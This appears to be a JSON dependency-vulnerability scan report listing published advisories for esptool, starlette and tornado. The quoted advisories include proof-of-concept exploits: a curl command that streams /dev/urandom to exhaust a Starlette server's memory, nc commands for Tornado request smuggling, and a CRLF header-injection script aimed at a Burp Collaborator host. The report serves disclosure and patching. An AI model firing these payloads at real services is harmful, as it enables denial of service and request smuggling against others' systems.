[
  {
    "package": {
      "name": "esptool",
      "version": "4.7.0",
      "ecosystem": "PyPI"
    },
    "dependency_groups": [
      "esphome-requirements"
    ],
    "vulnerabilities": [
      {
        "modified": "2024-01-02T13:04:16Z",
        "published": "2023-11-09T16:15:00Z",
        "schema_version": "1.6.0",
        "id": "PYSEC-2023-234",
        "aliases": [
          "CVE-2023-46894",
          "GHSA-3f38-96qm-r3fw"
        ],
        "details": "An issue discovered in esptool 4.6.2 allows attackers to view sensitive information via weak cryptographic algorithm.",
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "esptool",
              "purl": "pkg:pypi/esptool"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  }
                ]
              }
            ],
            "versions": [
              "1.0.0",
              "1.0.1",
              "1.1",
              "1.2",
              "1.2.1",
              "1.3",
              "2.0",
              "2.0.1",
              "2.1",
              "2.2",
              "2.2.1",
              "2.3",
              "2.3.1",
              "2.4.0",
              "2.4.1",
              "2.5.0",
              "2.5.1",
              "2.6",
              "2.7",
              "2.8",
              "3.0",
              "3.1",
              "3.2",
              "3.3",
              "3.3.1",
              "3.3.2",
              "3.3.3",
              "4.0",
              "4.0.1",
              "4.1",
              "4.2",
              "4.2.1",
              "4.3",
              "4.4",
              "4.5",
              "4.5.1",
              "4.5.dev0",
              "4.5.dev1",
              "4.5.dev2",
              "4.5.dev3",
              "4.6",
              "4.6.1",
              "4.6.2",
              "4.6.dev1",
              "4.7.dev1",
              "4.7.dev2",
              "4.7.dev3",
              "4.7.0",
              "4.8.dev1"
            ],
            "database_specific": {
              "source": "https://github.com/pypa/advisory-database/blob/main/vulns/esptool/PYSEC-2023-234.yaml"
            }
          }
        ],
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
          }
        ],
        "references": [
          {
            "type": "EVIDENCE",
            "url": "https://github.com/espressif/esptool/issues/926"
          }
        ]
      }
    ],
    "groups": [
      {
        "ids": [
          "PYSEC-2023-234"
        ],
        "aliases": [
          "CVE-2023-46894",
          "GHSA-3f38-96qm-r3fw",
          "PYSEC-2023-234"
        ],
        "max_severity": "7.5"
      }
    ]
  },
  {
    "package": {
      "name": "starlette",
      "version": "0.37.2",
      "ecosystem": "PyPI"
    },
    "dependency_groups": [
      "esphome-requirements"
    ],
    "vulnerabilities": [
      {
        "modified": "2024-10-15T20:01:19Z",
        "published": "2024-10-15T18:12:57Z",
        "schema_version": "1.6.0",
        "id": "GHSA-f96h-pmfr-66vw",
        "aliases": [
          "CVE-2024-47874"
        ],
        "summary": "Starlette Denial of service (DoS) via multipart/form-data",
        "details": "### Summary\nStarlette treats `multipart/form-data` parts without a `filename` as text form fields and buffers those in byte strings with no size limit. This allows an attacker to upload arbitrary large form fields and cause Starlette to both slow down significantly due to excessive memory allocations and copy operations, and also consume more and more memory until the server starts swapping and grinds to a halt, or the OS terminates the server process with an OOM error. Uploading multiple such requests in parallel may be enough to render a service practically unusable, even if reasonable request size limits are enforced by a reverse proxy in front of Starlette.\n\n### PoC\n\n```python\nfrom starlette.applications import Starlette\nfrom starlette.routing import Route\n\nasync def poc(request):\n    async with request.form():\n        pass\n\napp = Starlette(routes=[\n    Route('/', poc, methods=[\"POST\"]),\n])\n```\n\n```sh\ncurl http://localhost:8000 -F 'big=</dev/urandom'\n```\n\n### Impact\nThis Denial of service (DoS) vulnerability affects all applications built with Starlette (or FastAPI) accepting form requests.\n",
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "starlette",
              "purl": "pkg:pypi/starlette"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "fixed": "0.40.0"
                  }
                ]
              }
            ],
            "versions": [
              "0.1.0",
              "0.1.1",
              "0.1.10",
              "0.1.11",
              "0.1.12",
              "0.1.13",
              "0.1.14",
              "0.1.15",
              "0.1.16",
              "0.1.17",
              "0.1.2",
              "0.1.3",
              "0.1.4",
              "0.1.5",
              "0.1.6",
              "0.1.7",
              "0.1.8",
              "0.1.9",
              "0.10.0",
              "0.10.1",
              "0.10.2",
              "0.10.3",
              "0.10.4",
              "0.10.5",
              "0.10.6",
              "0.10.7",
              "0.11.0",
              "0.11.1",
              "0.11.2",
              "0.11.3",
              "0.11.4",
              "0.12.0",
              "0.12.0b1",
              "0.12.0b2",
              "0.12.0b3",
              "0.12.1",
              "0.12.10",
              "0.12.11",
              "0.12.12",
              "0.12.13",
              "0.12.2",
              "0.12.3",
              "0.12.4",
              "0.12.5",
              "0.12.6",
              "0.12.7",
              "0.12.8",
              "0.12.9",
              "0.13.0",
              "0.13.1",
              "0.13.2",
              "0.13.3",
              "0.13.4",
              "0.13.5",
              "0.13.6",
              "0.13.7",
              "0.13.8",
              "0.14.0",
              "0.14.1",
              "0.14.2",
              "0.15.0",
              "0.16.0",
              "0.17.0",
              "0.17.1",
              "0.18.0",
              "0.19.0",
              "0.19.1",
              "0.2.0",
              "0.2.1",
              "0.2.2",
              "0.2.3",
              "0.20.0",
              "0.20.1",
              "0.20.2",
              "0.20.3",
              "0.20.4",
              "0.21.0",
              "0.22.0",
              "0.23.0",
              "0.23.1",
              "0.24.0",
              "0.25.0",
              "0.26.0",
              "0.26.0.post1",
              "0.26.1",
              "0.27.0",
              "0.28.0",
              "0.29.0",
              "0.3.0",
              "0.3.1",
              "0.3.2",
              "0.3.3",
              "0.3.4",
              "0.3.5",
              "0.3.6",
              "0.3.7",
              "0.30.0",
              "0.31.0",
              "0.31.1",
              "0.32.0",
              "0.32.0.post1",
              "0.33.0",
              "0.34.0",
              "0.35.0",
              "0.35.1",
              "0.36.0",
              "0.36.1",
              "0.36.2",
              "0.36.3",
              "0.37.0",
              "0.37.1",
              "0.37.2",
              "0.38.0",
              "0.38.1",
              "0.38.2",
              "0.38.3",
              "0.38.4",
              "0.38.5",
              "0.38.6",
              "0.39.0",
              "0.39.1",
              "0.39.2",
              "0.4.0",
              "0.4.1",
              "0.4.2",
              "0.5.0",
              "0.5.1",
              "0.5.2",
              "0.5.3",
              "0.5.4",
              "0.5.5",
              "0.6.0",
              "0.6.1",
              "0.6.2",
              "0.6.3",
              "0.7.0",
              "0.7.1",
              "0.7.2",
              "0.7.3",
              "0.7.4",
              "0.8.0",
              "0.8.1",
              "0.8.2",
              "0.8.3",
              "0.8.4",
              "0.8.5",
              "0.8.6",
              "0.8.7",
              "0.8.8",
              "0.9.0",
              "0.9.1",
              "0.9.10",
              "0.9.11",
              "0.9.2",
              "0.9.3",
              "0.9.4",
              "0.9.5",
              "0.9.6",
              "0.9.7",
              "0.9.8",
              "0.9.9"
            ],
            "database_specific": {
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/10/GHSA-f96h-pmfr-66vw/GHSA-f96h-pmfr-66vw.json"
            }
          }
        ],
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"
          },
          {
            "type": "CVSS_V4",
            "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
          }
        ],
        "references": [
          {
            "type": "WEB",
            "url": "https://github.com/encode/starlette/security/advisories/GHSA-f96h-pmfr-66vw"
          },
          {
            "type": "ADVISORY",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47874"
          },
          {
            "type": "WEB",
            "url": "https://github.com/encode/starlette/commit/fd038f3070c302bff17ef7d173dbb0b007617733"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/encode/starlette"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-770"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2024-10-15T18:12:57Z",
          "nvd_published_at": "2024-10-15T16:15:05Z",
          "severity": "HIGH"
        }
      }
    ],
    "groups": [
      {
        "ids": [
          "GHSA-f96h-pmfr-66vw"
        ],
        "aliases": [
          "CVE-2024-47874",
          "GHSA-f96h-pmfr-66vw"
        ],
        "max_severity": "8.7"
      }
    ]
  },
  {
    "package": {
      "name": "tornado",
      "version": "6.4",
      "ecosystem": "PyPI"
    },
    "dependency_groups": [
      "esphome-requirements"
    ],
    "vulnerabilities": [
      {
        "modified": "2024-06-06T21:46:24Z",
        "published": "2024-06-06T21:41:20Z",
        "schema_version": "1.6.0",
        "id": "GHSA-753j-mpmx-qq6g",
        "related": [
          "CGA-2mj6-w546-q9r6",
          "CGA-72gj-8qx6-gcj4",
          "CGA-gfgp-4jrg-x8xh",
          "CGA-wq3q-35vc-xj9h"
        ],
        "summary": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') in tornado",
        "details": "### Summary\nWhen Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.\n\n### PoC\n0. Install Tornado.\n1. Start a simple Tornado server that echoes each received request's body:\n```bash\ncat << EOF > server.py\nimport asyncio\nimport tornado\n\nclass MainHandler(tornado.web.RequestHandler):\n    def post(self):\n        self.write(self.request.body)\n\nasync def main():\n    tornado.web.Application([(r\"/\", MainHandler)]).listen(8000)\n    await asyncio.Event().wait()\n\nasyncio.run(main())\nEOF\npython3 server.py &\n```\n2. Send a valid chunked request:\n```bash\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n3. Observe that the response is as expected:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:32:05 GMT\nContent-Length: 1\n\nZ\n```\n4. Send a request with two `Transfer-Encoding: chunked` headers:\n```\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n5. Observe the strange response:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:35:40 GMT\nContent-Length: 0\n\nHTTP/1.1 400 Bad Request\n\n```\nThis is because Tornado believes that the request has no message body, so it tries to interpret `1\\r\\nZ\\r\\n0\\r\\n\\r\\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.\n\n### Impact\nAnyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.\n",
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "tornado",
              "purl": "pkg:pypi/tornado"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "fixed": "6.4.1"
                  }
                ]
              }
            ],
            "versions": [
              "0.2",
              "1.0",
              "1.1",
              "1.1.1",
              "1.2",
              "1.2.1",
              "2.0",
              "2.1",
              "2.1.1",
              "2.2",
              "2.2.1",
              "2.3",
              "2.4",
              "2.4.1",
              "3.0",
              "3.0.1",
              "3.0.2",
              "3.1",
              "3.1.1",
              "3.2",
              "3.2.1",
              "3.2.2",
              "4.0",
              "4.0.1",
              "4.0.2",
              "4.1",
              "4.1b2",
              "4.2",
              "4.2.1",
              "4.2b1",
              "4.3",
              "4.3b1",
              "4.3b2",
              "4.4",
              "4.4.1",
              "4.4.2",
              "4.4.3",
              "4.4b1",
              "4.5",
              "4.5.1",
              "4.5.2",
              "4.5.3",
              "4.5b1",
              "4.5b2",
              "5.0",
              "5.0.1",
              "5.0.2",
              "5.0a1",
              "5.0b1",
              "5.1",
              "5.1.1",
              "5.1b1",
              "6.0",
              "6.0.1",
              "6.0.2",
              "6.0.3",
              "6.0.4",
              "6.0a1",
              "6.0b1",
              "6.1",
              "6.1b1",
              "6.1b2",
              "6.2",
              "6.2b1",
              "6.2b2",
              "6.3",
              "6.3.1",
              "6.3.2",
              "6.3.3",
              "6.3b1",
              "6.4",
              "6.4b1"
            ],
            "database_specific": {
              "last_known_affected_version_range": "<= 6.4.0",
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-753j-mpmx-qq6g/GHSA-753j-mpmx-qq6g.json"
            }
          }
        ],
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
          }
        ],
        "references": [
          {
            "type": "WEB",
            "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g"
          },
          {
            "type": "WEB",
            "url": "https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/tornadoweb/tornado"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-444"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2024-06-06T21:41:20Z",
          "nvd_published_at": null,
          "severity": "MODERATE"
        }
      },
      {
        "modified": "2024-06-06T22:04:10Z",
        "published": "2024-06-06T21:46:31Z",
        "schema_version": "1.6.0",
        "id": "GHSA-w235-7p84-xx57",
        "related": [
          "CGA-3mg6-hjmp-vwjr",
          "CGA-cj87-mmpg-46c2",
          "CGA-fgf6-jq66-8gmr",
          "CGA-jf2f-4wch-4c93"
        ],
        "summary": "Tornado has a CRLF injection in CurlAsyncHTTPClient headers",
        "details": "### Summary\nTornado\u2019s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.\n\n### Details\nWhen an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.\n\nThis behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.\n\nThis issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl\u2019s documentation states:\n\n> The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.\n\npycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado\u2019s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.\n\n### PoC\nThe issue can be reproduced using the following script:\n\n```python\nimport asyncio\n\nfrom tornado import httpclient\nfrom tornado import curl_httpclient\n\nasync def main():\n    http_client = curl_httpclient.CurlAsyncHTTPClient()\n\n    request = httpclient.HTTPRequest(\n        # Burp Collaborator payload\n        \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",\n        method=\"POST\",\n        body=\"body\",\n        # Injected header using CRLF characters\n        headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}\n    )\n\n    response = await http_client.fetch(request)\n    print(response.body)\n\n    http_client.close()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nWhen the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:\n\n```http\nPOST / HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nFoo: Bar\nHeader: Injected\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\nThe attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:\n\n```http\nPOST /attacker-controlled-url HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\n### Impact\nApplications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.",
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "tornado",
              "purl": "pkg:pypi/tornado"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "fixed": "6.4.1"
                  }
                ]
              }
            ],
            "versions": [
              "0.2",
              "1.0",
              "1.1",
              "1.1.1",
              "1.2",
              "1.2.1",
              "2.0",
              "2.1",
              "2.1.1",
              "2.2",
              "2.2.1",
              "2.3",
              "2.4",
              "2.4.1",
              "3.0",
              "3.0.1",
              "3.0.2",
              "3.1",
              "3.1.1",
              "3.2",
              "3.2.1",
              "3.2.2",
              "4.0",
              "4.0.1",
              "4.0.2",
              "4.1",
              "4.1b2",
              "4.2",
              "4.2.1",
              "4.2b1",
              "4.3",
              "4.3b1",
              "4.3b2",
              "4.4",
              "4.4.1",
              "4.4.2",
              "4.4.3",
              "4.4b1",
              "4.5",
              "4.5.1",
              "4.5.2",
              "4.5.3",
              "4.5b1",
              "4.5b2",
              "5.0",
              "5.0.1",
              "5.0.2",
              "5.0a1",
              "5.0b1",
              "5.1",
              "5.1.1",
              "5.1b1",
              "6.0",
              "6.0.1",
              "6.0.2",
              "6.0.3",
              "6.0.4",
              "6.0a1",
              "6.0b1",
              "6.1",
              "6.1b1",
              "6.1b2",
              "6.2",
              "6.2b1",
              "6.2b2",
              "6.3",
              "6.3.1",
              "6.3.2",
              "6.3.3",
              "6.3b1",
              "6.4",
              "6.4b1"
            ],
            "database_specific": {
              "last_known_affected_version_range": "<= 6.4.0",
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-w235-7p84-xx57/GHSA-w235-7p84-xx57.json"
            }
          }
        ],
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
          }
        ],
        "references": [
          {
            "type": "WEB",
            "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-w235-7p84-xx57"
          },
          {
            "type": "WEB",
            "url": "https://github.com/tornadoweb/tornado/commit/7786f09f84c9f3f2012c4cf3878417cb9f053669"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/tornadoweb/tornado"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-93"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2024-06-06T21:46:31Z",
          "nvd_published_at": null,
          "severity": "MODERATE"
        }
      }
    ],
    "groups": [
      {
        "ids": [
          "GHSA-753j-mpmx-qq6g"
        ],
        "aliases": [
          "GHSA-753j-mpmx-qq6g"
        ],
        "max_severity": "5.3"
      },
      {
        "ids": [
          "GHSA-w235-7p84-xx57"
        ],
        "aliases": [
          "GHSA-w235-7p84-xx57"
        ],
        "max_severity": "6.5"
      }
    ]
  }
]